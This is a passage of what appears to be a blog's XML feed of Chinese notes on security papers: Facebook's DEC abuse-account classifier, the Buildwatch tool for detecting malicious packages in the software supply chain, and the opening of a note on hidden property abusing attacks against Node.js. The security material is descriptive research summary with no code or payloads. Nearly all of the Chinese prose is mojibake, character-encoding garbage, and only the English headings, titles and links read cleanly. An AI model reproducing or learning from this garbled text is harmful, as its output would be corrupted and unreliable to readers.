ç»Ÿè´¦æˆ·æ»¥ç”¨æ£€æµ‹çš„è´¦æˆ·ã€‚ä¸»è¦æœ‰ä»¥ä¸‹å‡ æ–¹é¢ï¼š</p><ul><li>é€šè¿‡èšåˆè´¦æˆ·åœ¨ç¤¾äº¤å›¾ç»“æ„ä¸­çš„ç›´æ¥åŠé—´æ¥é‚»å±…çš„å±æ€§å’Œè¡Œä¸ºç‰¹å¾ï¼Œæå–è´¦æˆ·çš„â€œæ·±å±‚ç‰¹å¾â€</li><li>é‡‡ç”¨â€œå¤šé˜¶æ®µå¤šä»»åŠ¡å­¦ä¹ â€ï¼ˆMS-MTLï¼‰èŒƒå¼ï¼Œåˆ©ç”¨ä¸ç²¾ç¡®çš„ground truthï¼Œåœ¨ä¸åŒçš„é˜¶æ®µï¼Œæ¶ˆè€—å°‘é‡é«˜ç²¾åº¦çš„äººå·¥æ ‡è®°æ ·æœ¬å’Œå¤§é‡ä½ç²¾åº¦çš„è‡ªåŠ¨æ ‡è®°æ ·æœ¬ã€‚è¿™ç§ä½“ç³»ç»“æ„å°†äº§ç”Ÿä¸€ä¸ªå•ä¸€çš„æ¨¡å‹ï¼Œä¸ºå¤šç§ç±»å‹çš„æ»¥ç”¨è´¦æˆ·æä¾›äº†é«˜ç²¾åº¦çš„åˆ†ç±»ã€‚</li><li>é€šè¿‡å„ç§æŠ½æ ·å’Œé‡æ–°åˆ†ç±»ç­–ç•¥ï¼Œå‡å°‘ç³»ç»Ÿè´Ÿè·ï¼Œæœ€ç»ˆç»Ÿè®¡è§„æ¨¡è¾¾æ•°åäº¿ç”¨æˆ·ã€‚<br>æ€»çš„æ¥è¯´DECæ—¨åœ¨é€šè¿‡åœ¨ç¤¾äº¤å›¾ä¸Šé‡‡ç”¨æ”»å‡»è€…éš¾ä»¥æ“çºµçš„ç¨€ç–èšåˆç‰¹å¾ä»¥åŠä½¿ç”¨å¤šé˜¶æ®µè®­ç»ƒæ¡†æ¶æ¥è¿›ä¸€æ­¥å‡å°‘è¿™äº›æ»¥ç”¨è´¦æˆ·ã€‚</li></ul><h2 id="0x02-DEC"><a href="#0x02-DEC" class="headerlink" title="0x02 DEC"></a>0x02 DEC</h2><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/b098f4ae-f9a2-4be1-b334-ba7378802cec.png"></p><h3 id="Online-Component"><a href="#Online-Component" class="headerlink" title="Online Component"></a>Online Component</h3><p>DECç”±Facebookç”¨æˆ·è¡Œä¸ºè§¦å‘ã€‚å½“ä¸€ä¸ªåŠ¨ä½œå‘ç”Ÿæ—¶ï¼ŒDECå¯ä»¥åŸºäºå¯å‘å¼è°ƒåº¦ä¸ç”¨æˆ·æ´»åŠ¨åŒæ—¶è¿›è¡Œçš„ä»»åŠ¡ï¼Œä»¥å¼€å§‹æå–ç›®æ ‡èŠ‚ç‚¹å’Œé‡‡æ ·ç›¸é‚»èŠ‚ç‚¹çš„åŸå§‹ç‰¹å¾ã€‚ç‰¹å¾æå–åï¼ŒDECå°†åŸå§‹ç‰¹å¾èšåˆæˆæ•°å­—ç¨€ç–ç‰¹å¾ã€‚ç„¶åï¼ŒDECæ ¹æ®èšåˆçš„ç‰¹å¾å’Œæ¨¡å‹ç”Ÿæˆè´¦æˆ·çš„åˆ†ç±»ç»“æœã€‚</p><h3 id="Offline-Component"><a href="#Offline-Component" class="headerlink" title="Offline Component"></a>Offline Component</h3><p>DEC çš„ç¦»çº¿ç»„ä»¶åŒ…æ‹¬æ¨¡å‹è®­ç»ƒå’Œåé¦ˆå¤„ç†ã€‚ ä¸ºäº†å¯¹å¤šç§ç±»å‹çš„æ»¥ç”¨è¿›è¡Œåˆ†ç±»ï¼ŒDEC ç»´æŠ¤äº†å¤šä¸ªæ¨¡å‹ï¼Œå…¶ä¸­æ¯ä¸ªæ¨¡å‹å¤„ç†ä¸åŒç±»å‹çš„æ»¥ç”¨ã€‚æ¯ä¸ªä¸“ç”¨æ¨¡å‹éƒ½åœ¨ä»ä½œä¸ºå¹¶å‘ç‰¹å¾æå–ï¼ˆåœ¨çº¿ç»„ä»¶ï¼‰çš„ä¸€éƒ¨åˆ†æ”¶é›†çš„åŸå§‹ç‰¹å¾ä¸­å­¦ä¹ åˆ°çš„ä½ç»´åµŒå…¥ä¸Šè¿›è¡Œè®­ç»ƒã€‚</p><p>æ€»çš„æ¥è¯´ï¼ŒDECä¸»è¦åšäº†ï¼š</p><ol><li>æå– Facebook ä¸Šæ‰€æœ‰æ´»è·ƒè´¦æˆ·çš„â€œæ·±åº¦ç‰¹å¾â€ä»¥è¿›è¡Œåˆ†ç±»</li><li>ä½¿ç”¨åˆ†ç±»æ¥é¢„æµ‹æ‰€æœ‰æ´»è·ƒè´¦æˆ·çš„æ»¥ç”¨ç¨‹åº¦ï¼Œæ€»æ˜¯å¯¹æ‰€æœ‰ç§¯æå‚ä¸ç½‘ç»œçš„ç”¨æˆ·è¿›è¡Œåˆ†ç±»ï¼Œå¹¶ç»´æŒæœ€æ–°çš„åˆ†ç±»ç»“æœ</li><li>ç»“åˆç”¨æˆ·å’Œæ ‡ç­¾çš„åé¦ˆæ¥è¿­ä»£åˆ†ç±»å™¨æ¨¡å‹</li></ol><h2 id="0x03-Deep-Feature-Extraction"><a href="#0x03-Deep-Feature-Extraction" class="headerlink" title="0x03 Deep Feature Extraction"></a>0x03 Deep Feature Extraction</h2><p>ç‰¹å¾æå–æ˜¯DECçš„æ ¸å¿ƒéƒ¨åˆ†ã€‚ä¸ä¼ ç»Ÿçš„æ»¥ç”¨æ£€æµ‹ç³»ç»Ÿç›¸æ¯”ï¼ŒDECä½¿ç”¨èšåˆç‰¹å¾è®¡ç®—è¿‡ç¨‹ï¼Œæ—¨åœ¨æå–â€œç›®æ ‡â€è´¦æˆ·çš„æ·±å±‚ç‰¹å¾</p><h3 id="Deep-features"><a href="#Deep-features" class="headerlink" title="Deep features"></a>Deep features</h3><p>åœ¨DECçš„ä¸Šä¸‹æ–‡ä¸­ï¼Œâ€œæ·±åº¦â€æ˜¯æŒ‡åœ¨ç¤¾äº¤å›¾è°±ä¸­æ•£å¼€çš„è¿‡ç¨‹ã€‚è¯¥å›¾ä¸ä»…åŒ…å«ç”¨æˆ·ï¼Œè¿˜åŒ…å«å¹³å°æ”¯æŒçš„æ‰€æœ‰å®ä½“ï¼Œä¾‹å¦‚ç¾¤ç»„ã€å¸–å­ç­‰ã€‚ç›´æ¥ç‰¹å¾æ˜¯ä»…ä¸ç‰¹å®šå®ä½“ç›¸å…³çš„ç‰¹å¾ï¼Œä¾‹å¦‚å¸æˆ·å¹´é¾„æˆ–ç»„å¤§å°ã€‚æ·±åº¦ç‰¹å¾æ˜¯ä¸€ç§ç‰¹å¾ï¼Œå®ƒæ˜¯ä¸ç›¸å…³å®ä½“ç›¸å…³è”çš„å®ä½“çš„ç›´æ¥ç‰¹å¾çš„å‡½æ•°ã€‚ä¾‹å¦‚ï¼Œâ€œä¸€ä¸ªå¸æˆ·çš„æœ‹å‹çš„å¹³å‡å¹´é¾„â€æ˜¯è¯¥å¸æˆ·çš„ä¸€ä¸ªæ·±å±‚ç‰¹å¾ã€‚ æ·±åº¦ç‰¹å¾å¯ä»¥é€’å½’å®šä¹‰ï¼Œä½œä¸ºå…³è”è´¦æˆ·æ·±åº¦ç‰¹å¾çš„èšåˆã€‚ä¾‹å¦‚ï¼Œç…§ç‰‡ä¸Šçš„ä¸€ä¸ªæ·±å±‚ç‰¹å¾å¯ä»¥æ˜¯â€œç…§ç‰‡ä¸­æ ‡è®°çš„äººçš„æœ‹å‹åŠ å…¥çš„ç¾¤ç»„çš„å¹³å‡æ•°é‡â€</p><p>æ¢å¥è¯è¯´ï¼Œæ·±åº¦ç‰¹å¾ä¸»è¦æŒ‡çš„æ˜¯é‚£äº›æ½œåœ¨çš„ï¼Œè´¦æˆ·æ»¥ç”¨è€…æ²¡åŠæ³•è½»æ˜“æ“æ§çš„ã€‚ä¾‹å¦‚ï¼Œè´¦æˆ·å¥½å‹çš„å¹³å‡å¹´é¾„ç­‰ã€‚</p><p>ä¸‹æ ‡åˆ—å‡ºäº†DECè€ƒè™‘çš„ä¸€äº›å®ä½“ç±»å‹ï¼ŒåŒ…æ‹¬ç”¨æˆ·ã€ç¾¤ç»„ã€è®¾å¤‡ã€ç…§ç‰‡ã€çŠ¶æ€æ›´æ–°å’Œç¾¤ç»„å¸–å­<br><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/6d0e2f7a-e2af-4e24-97ff-7a82520c085c.png"></p><h3 id="Feature-selection"><a href="#Feature-selection" class="headerlink" title="Feature selection"></a>Feature selection</h3><p>åœ¨DECä¸­è¿›è¡Œåˆ†ç±»æ—¶ï¼Œä½œè€…åªä½¿ç”¨ç›®æ ‡è´¦æˆ·çš„æ·±å±‚ç‰¹å¾ï¼Œè€Œä¸æ˜¯ç›´æ¥ç‰¹å¾ã€‚ä¸»è¦åŸå› æ˜¯ç›´æ¥ç›®æ ‡å¸æˆ·ç‰¹å¾ææœ‰å¯èƒ½æˆä¸ºæ¨¡å‹ä¸­çš„ä¸»å¯¼ç‰¹å¾ã€‚</p><h2 id="0x04-Multi-Stage-Multi-Task-Learning"><a href="#0x04-Multi-Stage-Multi-Task-Learning" class="headerlink" title="0x04 Multi-Stage Multi-Task Learning"></a>0x04 Multi-Stage Multi-Task Learning</h2><p>MTL ä½¿ç”¨å•ä¸ªç¥ç»ç½‘ç»œæ¨¡å‹å¹¶è¡Œè®­ç»ƒå¤šä¸ªç›¸å…³çš„â€œä»»åŠ¡â€ã€‚ æ ¸å¿ƒæ€æƒ³æ˜¯æ¨¡å‹ä¸ºæ¯ä¸ªä»»åŠ¡å­¦ä¹ çš„ä¸œè¥¿å¯ä»¥æé«˜å…¶ä»–ä»»åŠ¡çš„æ€§èƒ½ã€‚åœ¨æˆ‘ä»¬æ»¥ç”¨å¸æˆ·åˆ†ç±»çš„èƒŒæ™¯ä¸‹ï¼Œâ€œä»»åŠ¡â€å’Œâ€œæ ‡ç­¾â€å®šä¹‰å¦‚ä¸‹ï¼š</p><ul><li>ä»»åŠ¡æ˜¯æŒ‡å¯¹OSNä¸Šç‰¹å®šç±»åˆ«çš„æ»¥ç”¨å¸æˆ·è¿›è¡Œåˆ†ç±»ï¼ˆä¾‹å¦‚ï¼Œä¼ªé€ å¸æˆ·ã€åƒåœ¾é‚®ä»¶å¸æˆ·ï¼‰</li><li>è®­ç»ƒæ ·æœ¬çš„æ ‡ç­¾æ˜¯ä¸€ä¸ªå¸ƒå°”å€¼ï¼ŒæŒ‡ç¤ºæ ·æœ¬æ˜¯å¦å±äºæ»¥ç”¨å¸æˆ·ç±»åˆ«ã€‚æ¯ä¸ªè®­ç»ƒç¤ºä¾‹éƒ½æœ‰å¤šä¸ªæ ‡ç­¾ï¼Œæ¯ä¸ªä»»åŠ¡ä¸€ä¸ªã€‚æ­¤å¤šæ ‡ç­¾ç”±å¸ƒå°”å€¼å‘é‡è¡¨ç¤º</li></ul><h3 id="Model-Training-Flow"><a href="#Model-Training-Flow" class="headerlink" title="Model Training Flow"></a>Model Training Flow</h3><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/fe7e4f78-f42b-4119-8c87-f7f806a501c0.png"></p><p><strong>First Stage: Low Precision Training</strong></p><p>ç¬¬ä¸€ä¸ªè®­ç»ƒé˜¶æ®µçš„ç›®æ ‡æ˜¯å°†èšåˆçš„åŸå§‹æ·±åº¦ç‰¹å¾çš„é«˜ç»´å‘é‡å‡å°‘ä¸ºä½ç»´embeddingå‘é‡ã€‚</p><p><strong>Second Stage: High Precision Training</strong></p><p>åˆ©ç”¨è½¬ç§»å­¦ä¹ ä¸­çš„æŠ€æœ¯ï¼Œä»ç¬¬ä¸€é˜¶æ®µæ¨¡å‹ä¸­æå–æœ€åä¸€ä¸ªéšè—å±‚çš„è¾“å‡ºï¼Œä½œä¸ºç¬¬äºŒé˜¶æ®µçš„è¾“å…¥ã€‚ä½¿ç”¨é«˜ç²¾åº¦çš„äººç±»æ ‡è®°æ•°æ®å¯¹ç¬¬äºŒé˜¶æ®µï¼ˆGBDTæ¨¡å‹ï¼‰è¿›è¡Œè®­ç»ƒï¼Œä»¥å¯¹æ»¥ç”¨è´¦æˆ·è¿›è¡Œåˆ†ç±»ï¼Œè€Œä¸è€ƒè™‘è¿è§„çš„å­ç±»å‹ã€‚GBDTæ¨¡å‹è¾“å‡ºçš„åˆ†æ•°ä¸ºæœ€ç»ˆDECåˆ†ç±»åˆ†æ•°ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Paper Reading </category>
          
      </categories>
      
      
        <tags>
            
            <tag> USENIX Security&#39;21 </tag>
            
            <tag> OSN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PR - Towards Detection of Software Supply Chain Attacks by Forensic Artifacts</title>
      <link href="/2021/07/28/Towards%20Detection%20of%20Software%20Supply%20Chain%20Attacks/"/>
      <url>/2021/07/28/Towards%20Detection%20of%20Software%20Supply%20Chain%20Attacks/</url>
      
        <content type="html"><![CDATA[<blockquote><p><em>åŸæ–‡ä½œè€…ï¼šM Ohm, A Sykosch, M Meier</em></p><p><em>åŸæ–‡æ ‡é¢˜ï¼šTowards Detection of Software Supply Chain Attacks by Forensic Artifacts</em></p><p><em>åŸæ–‡é“¾æ¥ï¼š<a href="https://doi.org/10.1145/3407023.3409183">https://doi.org/10.1145/3407023.3409183</a></em></p><p><em>åŸæ–‡æ¥æºï¼šARES &#39;20</em></p><p><em>ç¬”è®°ä½œè€…ï¼šoutx</em></p></blockquote><h2 id="0x01-Introduction"><a href="#0x01-Introduction" class="headerlink" title="0x01 Introduction"></a>0x01 Introduction</h2><p>ç°æœ‰é’ˆå¯¹è½¯ä»¶ä¾›åº”é“¾æ”»å‡»çš„æ£€æµ‹å¤§å¤šä¾§é‡äºæ£€æµ‹é‚£äº›å­˜åœ¨æ¼æ´ã€æ˜“å—åˆ°æ”»å‡»çš„å¼€æºè½¯ä»¶åŒ…ï¼Œå¹¶æ²¡æœ‰å¾ˆæ˜ç¡®åœ°è€ƒè™‘é‚£äº›å¸¦æœ‰æ¶æ„æ€§çš„è½¯ä»¶åŒ…æ‰€é€ æˆçš„è½¯ä»¶ä¾›åº”é“¾æ”»å‡»ã€‚ä½œè€…å‘ç°æ¶æ„è½¯ä»¶åŒ…é€šå¸¸ä¼šåœ¨å®‰è£…çš„æ—¶å€™å¼•å…¥å¤§é‡æ–°çš„æ•æ„Ÿæ“ä½œï¼Œè¿™ä¸è¯¥è½¯ä»¶åŒ…æ­£å¸¸çš„ç‰ˆæœ¬å®‰è£…æ—¶æˆªç„¶ä¸åŒã€‚åŸºäºè¿™ä¸ªå‘ç°ï¼Œä½œè€…æå‡ºäº†Buildwatchï¼Œè¿™æ˜¯ä¸€ç§åŠ¨æ€åˆ†æè½¯ä»¶åŠå…¶ç¬¬ä¸‰æ–¹ä¾èµ–çš„æ¡†æ¶ã€‚</p><h2 id="0x02-Methodology"><a href="#0x02-Methodology" class="headerlink" title="0x02 Methodology"></a>0x02 Methodology</h2><p>æœ¬æ–‡ä¸»è¦æ˜¯ä»å¼€æºè½¯ä»¶åŒ…ä¸­æå–å’Œåˆ†æé‚£äº›æ•æ„Ÿæ“ä½œï¼Œä¾‹å¦‚åœ¨å®‰è£…è¿™ä¸ªè½¯ä»¶åŒ…çš„æ—¶å€™åˆ›å»ºä¸€ä¸ªæ–‡ä»¶æˆ–æ˜¯è¿æ¥åˆ°æŸä¸€ä¸ªä¸»æœºç­‰è¡Œä¸ºã€‚ä½œè€…ä¸»è¦å…³æ³¨çš„æ˜¯åŒä¸€ä¸ªè½¯ä»¶åŒ…çš„æ¶æ„ç‰ˆæœ¬å’Œè‰¯æ€§ç‰ˆæœ¬ä¹‹é—´çš„å¯¹æ¯”å·®å¼‚ï¼Œå¹¶ä¸”æå‡ºäº†ä¸‹åˆ—å‡è®¾ï¼š</p><p><strong>æ¶æ„è½¯ä»¶åŒ…ç”±äºå¼•å…¥äº†è¿™äº›æ•æ„Ÿæ“ä½œä¼šäº§ç”Ÿæ˜¾è‘—çš„å˜åŒ–</strong></p><p>è¿™ä¸€éƒ¨åˆ†çš„ç”¨äºäººå·¥å®¡æŸ¥çš„å€™é€‰åŒ…åŒ…æ‹¬é‚£äº›è¿‡å»è¢«æ”»å‡»è¿‡çš„å’Œè¢«å…¬å¼€æŠ«éœ²å®šæ€§ä¸ºæ¶æ„çš„ï¼Œä»¥åŠç°æœ‰è¢«ç›¸å…³æ¼æ´å½±å“çš„å’Œåœ¨å®‰è£…è¿‡ç¨‹ä¸­æœ‰æ¶æ„è¡Œä¸ºçš„è½¯ä»¶åŒ…ã€‚æ‰€æœ‰é€‰ä¸­çš„åŒ…å¦‚ä¸‹å›¾ï¼š</p><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/9131c2e5-150d-45da-90d7-519b14b54870.png"></p><p>ä½œè€…ä½¿ç”¨äº†Cuckooä½œä¸ºæ²™ç®±æ¥æµ‹è¯•è¿™äº›è½¯ä»¶åŒ…ï¼Œå¹¶åœ¨æ²™ç®±ä¸­å®‰è£…è¿™äº›åŒ…ï¼Œç„¶åè§‚å¯Ÿå…¶ç³»ç»Ÿè°ƒç”¨ç­‰æƒ…å†µã€‚å…·ä½“ç³»ç»Ÿè°ƒç”¨å’Œå…¶æ ‡å¿—ä½å¦‚ä¸‹å›¾ï¼š</p><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/4158690d-4de4-425d-9014-a7f71bff61f4.png"></p><p>æœ‰äº†ä¸Šè¿°æ¦‚å¿µåï¼Œä¸‹é¢æ˜¯ä¸€ä¸ªå°†pythonçš„ä»£ç å¯¹åº”åˆ°ç³»ç»Ÿè°ƒç”¨çš„ç›´è§‚å®ä¾‹ï¼š</p><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/93608592-164d-4c0c-b0ef-a928e6f3cae4.png"></p><h2 id="0x03-Buildwatch"><a href="#0x03-Buildwatch" class="headerlink" title="0x03 Buildwatch"></a>0x03 Buildwatch</h2><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/2350ba08-42d1-41c8-aaeb-d93536d47554.png"><br>Buildwatchä¸»è¦è¿˜æ˜¯é’ˆå¯¹åœ¨æäº¤ä»£ç è¿™ä¸ªè¿‡ç¨‹ä¸­åŠ ä¸Šäº†ä¸€ä¸ªå‰ç½®å¤„ç†ï¼Œç”¨äºæ£€æµ‹è¿™äº›ä»£ç ä¸­æ˜¯å¦å­˜åœ¨ä¸€äº›å¯ç–‘çš„æ“ä½œï¼Œç„¶åä¸æ­£å¸¸çš„ç‰ˆæœ¬è¿›è¡Œdiffæ“ä½œï¼Œè¾“å‡ºä¸€ä»½ç»“æœç»™ä½¿ç”¨è€…å‚è€ƒï¼Œä¾‹å¦‚ï¼š</p><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/980fae14-9810-4e8e-9681-570fa951cbe0.png"></p><h2 id="0x04-Conclusion"><a href="#0x04-Conclusion" class="headerlink" title="0x04 Conclusion"></a>0x04 Conclusion</h2><p>ä½œè€…ä¸»è¦å…³æ³¨çš„æ˜¯è½¯ä»¶åŒ…è¿­ä»£ä¸­çš„å·®å¼‚æ€§ï¼Œå› ä¸ºå­˜åœ¨é»‘å®¢å…¥ä¾µç»´æŠ¤è€…PCä¿®æ”¹æºä»£ç è¿™ç±»å¯èƒ½æ€§ï¼Œè¿™ä¹Ÿæ˜¯ä¾›åº”é“¾æ”»å‡»ä¸­å¸¸è§çš„ä¸€ç§æ”»å‡»æ‰‹æ³•ã€‚äºæ˜¯ï¼Œåœ¨ç»´æŠ¤è€…æäº¤æ›´æ–°è½¯ä»¶åŒ…ä¹‹å‰å¯ä»¥è¿è¡Œä½œè€…å®ç°çš„Buildwatchï¼Œç”¨äºå‘ç°é‚£äº›å¯ç–‘çš„æ–°å¢æ•æ„Ÿæ“ä½œã€‚</p><p>å¦‚æ­¤ä¸€æ¥ï¼Œäººå·¥å®¡æŸ¥é™æ€ä»£ç çš„æˆæœ¬é™ä½äº†å¾ˆå¤šï¼Œå°±å¦‚ä¸Šå›¾ä¸­æ‰€ç¤ºï¼Œè¿™æ ·çš„ç»“æœè¾“å‡ºæ˜¯ååˆ†æ¸…æ™°æ˜äº†çš„ã€‚ä½†ç›¸åº”çš„ä¹Ÿå­˜åœ¨ä¸€äº›é—®é¢˜ï¼š</p><ol><li>å¦‚æœæ¶æ„ä»£ç çš„å…¥å£éƒ¨åˆ†å­˜åœ¨ç€ä¾‹å¦‚æ£€æµ‹æ˜¯å¦æ˜¯æ²™ç®±ç¯å¢ƒç­‰åè°ƒè¯•ä»£ç ï¼Œè¿™ä¸ªæ–¹æ³•ææ€•ä¼šå‡ºç°ä¸€äº›é—®é¢˜</li><li>ä»…å…³æ³¨è½¯ä»¶åŒ…è¿­ä»£ä¸­å¼•å…¥çš„æ–°æ“ä½œæ˜¯å¦ä¼šå¿½ç•¥æ‰è¿™äº›è½¯ä»¶åŒ…ä¸­æœ¬å°±å­˜åœ¨çš„æ¶æ„ä»£ç ï¼Œä¾‹å¦‚ä¸€å¼€å§‹å°±ä¸Šä¼ çš„æ˜¯ä¸€ä¸ªæ¶æ„è½¯ä»¶åŒ…ï¼Œåç»­çš„è¿­ä»£åŒ…ä¸­ä¹Ÿä¿æŒäº†è¿™ä¸€æ®µæ¶æ„ä»£ç </li><li>çº¯åŠ¨æ€åˆ†æå¾ˆå¤šæ—¶å€™å¯¹äºä¸€äº›ä»£ç åˆ†æ”¯ä¼šæ‰§è¡Œä¸åˆ°ï¼Œè¿™ä¸€ç‚¹å¯ä»¥è€ƒè™‘ä¼˜å…ˆé€šè¿‡é™æ€åˆ†æç­›é€‰ï¼Œå†è¿›è¡ŒåŠ¨æ€åˆ†æã€‚ä¸€æ˜¯é™ä½äº†åŠ¨æ€åˆ†æçš„æ—¶é—´æˆæœ¬å’Œèµ„æºæˆæœ¬ï¼ŒäºŒæ˜¯ç»“åˆè¿™ä¸¤è€…çš„ä¼˜ç‚¹ï¼Œå¯ä»¥åšåˆ°ä¸€ä¸ªé€Ÿåº¦ä¸å‡†ç¡®çš„ç›¸å¯¹å¹³è¡¡</li></ol>]]></content>
      
      
      <categories>
          
          <category> Paper Reading </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Supply Chain Attack </tag>
            
            <tag> ARES&#39;20 </tag>
            
            <tag> Dynamic Analysis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PR - Abusing Hidden Properties to Attack the Node.js Ecosystem</title>
      <link href="/2021/07/20/Abusing%20Hidden%20Properties%20to%20Attack%20the%20Node.js%20Ecosystem/"/>
      <url>/2021/07/20/Abusing%20Hidden%20Properties%20to%20Attack%20the%20Node.js%20Ecosystem/</url>
      
        <content type="html"><![CDATA[<blockquote><p><em>åŸæ–‡ä½œè€…ï¼šF Xiao, J Huang, Y Xiong, G Yang, H Hu, G Gu</em></p><p><em>åŸæ–‡æ ‡é¢˜ï¼šAbusing Hidden Properties to Attack the Node.js Ecosystem</em></p><p><em>åŸæ–‡é“¾æ¥ï¼š<a href="https://www.usenix.org/system/files/sec21fall-xiao.pdf">https://www.usenix.org/system/files/sec21fall-xiao.pdf</a></em></p><p><em>åŸæ–‡æ¥æºï¼šUSENIX Security 2021</em></p><p><em>ç¬”è®°ä½œè€…ï¼šoutx</em></p></blockquote><h2 id="0x01-Introduction"><a href="#0x01-Introduction" class="headerlink" title="0x01 Introduction"></a>0x01 Introduction</h2><p>ç”±äºç›®å‰è¿˜æ²¡æœ‰ç‰¹åˆ«å®Œå–„çš„é’ˆå¯¹JavaScriptå’ŒNode.jsç¨‹åºä¸­çš„å®‰å…¨é£é™©çš„ç ”ç©¶å’Œç†è§£ã€‚äºæ˜¯åœ¨æœ¬æ–‡ä¸­ï¼Œä½œè€…å®šä¹‰äº†ä¸€ç§æ–°å‹æ”»å‡»æ‰‹æ³•ç”¨äºè¯´æ˜åœ¨JavaScriptå’ŒNode.jsç¨‹åºä¸­ä¹Ÿå­˜åœ¨ç€ä¸€å®šçš„å®‰å…¨é£é™©ã€‚è¿™ç§æ”»å‡»æ‰‹æ³•è¢«å‘½åä¸ºHPA(hidden property abusing)ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨å…¶ç‰¹æ€§çªƒå–æœºå¯†æ•°æ®ã€ç»•è¿‡å®‰å…¨æ£€æŸ¥å¹¶å‘èµ·æ‹’ç»æœåŠ¡æ”»å‡»ï¼Œå…¶å®ä¾‹å¦‚ä¸‹å›¾ã€‚<br><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/9ae954f3-b660-45a7-941b-7b8655b52315.png"></p><p>å…·ä½“è¿‡ç¨‹å¯ä»¥ç®€å•æè¿°ä¸ºï¼šæ”»å‡»è€…é¦–å…ˆå‘æœåŠ¡ç«¯å‘é€ç²¾å¿ƒåˆ¶ä½œå¥½çš„jsonæ•°æ®ï¼Œè¿™ä¸ªjsonæ•°æ®ä¼šæºå¸¦ä¸€ä¸ªé¢å¤–çš„è€ŒéæœåŠ¡ç«¯æ‰€æœŸæœ›çš„å±æ€§<code>I2</code>ï¼ˆè¢«ç§°ä¹‹ä¸ºéšè—å±æ€§ï¼‰ã€‚æ¥ç€æœåŠ¡ç«¯æŒ‰ç…§æ­£å¸¸æµç¨‹å¯¹è¯¥jsonæ•°æ®è¿›è¡Œå¤„ç†ï¼Œé‚£ä¹ˆè¿™ä¸ª<code>I2</code>å°†ä¼šä¼ æ’­è‡³ä¸€ä¸ªå†…éƒ¨å¯¹è±¡ä¸­ï¼Œå¦‚å›¾ä¸­æ ‡çº¢å¤„ï¼ŒI2å°†è¦†ç›–å†…éƒ¨å¯¹è±¡çš„å±æ€§ã€‚ä¸€æ—¦è¿™äº›å±æ€§å¯ä»¥è¢«æ”»å‡»è€…æ‰€æ§åˆ¶ï¼Œé‚£ä¹ˆæ”»å‡»è€…å°±èƒ½å¤Ÿç»•è¿‡ä¸€äº›å®‰å…¨æ£€æŸ¥ï¼Œè§¦å‘ä¸€äº›æœ¬ä¸ä¼šè§¦å‘çš„ä»£ç æµç¨‹ï¼Œä¾‹å¦‚ä¸‹å›¾ä¸­åˆ©ç”¨HPAç»•è¿‡Node.jsæ¡†æ¶routing-controllerçš„è¾“å…¥éªŒè¯æ£€æµ‹ã€‚<br><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/5011f3d8-d332-4c81-899f-7ca302dfd9c1.png"></p><h2 id="0x02-Contribution"><a href="#0x02-Contribution" class="headerlink" title="0x02 Contribution"></a>0x02 Contribution</h2><ul><li>å®šä¹‰äº†é’ˆå¯¹Node.jsç¨‹åºçš„éšè—å±æ€§æ»¥ç”¨(hidden property abusing, HPA)æ”»å‡»ï¼Œå¹¶è¯´æ˜äº†å…¶å¸¦æ¥çš„ä¸¥é‡çš„å®‰å…¨åæœ</li><li>è®¾è®¡å¹¶å®ç°äº†LYNXï¼Œè¿™æ˜¯ä¸€ä¸ªè‡ªåŠ¨æ£€æµ‹HPAæ¼æ´å¹¶è¿›è¡Œç»¼åˆåˆ©ç”¨çš„å·¥å…·</li><li>å…¶ç»“æœè¯„ä¼°æ­ç¤ºäº†å®é™…æƒ…å†µä¸‹Npmè½¯ä»¶åŒ…ä¸­çš„HPAé—®é¢˜ï¼Œè¿™ä¼šå¯¼è‡´ä¸¥é‡çš„å®‰å…¨é—®é¢˜</li></ul><h2 id="0x03-Hidden-Property-Abusing"><a href="#0x03-Hidden-Property-Abusing" class="headerlink" title="0x03 Hidden Property Abusing"></a>0x03 Hidden Property Abusing</h2><p>åœ¨JavaScriptä¸­ï¼Œæ¯ä¸ªå¯¹è±¡éƒ½æœ‰ä¸€ä¸ªæŒ‡å‘åŸå‹å¯¹è±¡çš„é“¾æ¥ã€‚å½“ç¨‹åºè¦è®¿é—®ä¸€ä¸ªå¯¹è±¡çš„æŸä¸ªå±æ€§æ—¶ï¼Œè¯¥å±æ€§ä¸ä»…ä¼šåœ¨è¯¥å¯¹è±¡ä¸Šæœç´¢ï¼Œè€Œä¸”ä¼šåœ¨è¯¥å¯¹è±¡çš„åŸå‹ä¸Šæœç´¢ï¼ˆç”šè‡³åœ¨åŸå‹çš„åŸå‹ä¸Šæœç´¢ï¼‰ï¼Œç›´åˆ°æ‰¾åˆ°ä¸€ä¸ªåç§°åŒ¹é…çš„å±æ€§ã€‚å› æ­¤ï¼Œæ¯ä¸ªå¯¹è±¡é™¤äº†è‡ªå·±çš„å±æ€§å¤–ï¼Œè¿˜æœ‰è®¸å¤šç»§æ‰¿çš„å±æ€§ã€‚ç„¶è€Œï¼Œå¦‚æœæœ‰ä¸€ä¸ªå†²çªçš„åç§°å±æ€§ä½äºæœç´¢æ ‘çš„æ›´é«˜å±‚æ¬¡ï¼Œè¿™æ ·çš„ç»§æ‰¿é“¾å°±ä¼šè¢«åŠ«æŒã€‚</p><p>éœ€è¦æ³¨æ„çš„æ˜¯è¿™ä¸åŸå‹é“¾æ±¡æŸ“ä¸åŒï¼Œå…·ä½“æ¥è¯´åŸå‹æ±¡æŸ“éœ€è¦å¯¹åŸå‹è¿›è¡Œä¿®æ”¹ï¼Œè€ŒHPAå¹¶ä¸éœ€è¦è¿™ä¹ˆåšï¼Œå…¶æœ¬è´¨ä¸Šåªæ˜¯åŠ«æŒè€Œéä¿®æ”¹ã€‚</p><h2 id="0x04-Lynxè®¾è®¡ä¸å®ç°"><a href="#0x04-Lynxè®¾è®¡ä¸å®ç°" class="headerlink" title="0x04 